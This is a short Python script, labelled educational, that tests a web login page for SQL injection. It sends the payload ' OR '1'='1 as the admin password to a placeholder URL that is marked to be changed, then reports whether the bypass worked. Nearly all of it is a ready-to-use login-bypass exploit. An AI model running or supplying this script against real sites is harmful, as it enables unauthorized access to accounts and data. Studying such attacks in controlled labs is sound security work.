"""
FOR EDUCATIONAL PURPOSES

USE ONLY IN CONTROLLED ENVIRONMENTS


GABRIEL ROZENDO
"""

import requests


target_url = "http://example.com/login.php" # change


payload = "' OR '1'='1" # Define the payload

params = {
    'username': 'admin',
    'password': payload
}

# Send the request
response = requests.get(target_url, params=params)

# Check the response
if "Welcome, admin" in response.text:
    print("SQL Injection successful!")
else:
    print("SQL Injection failed.")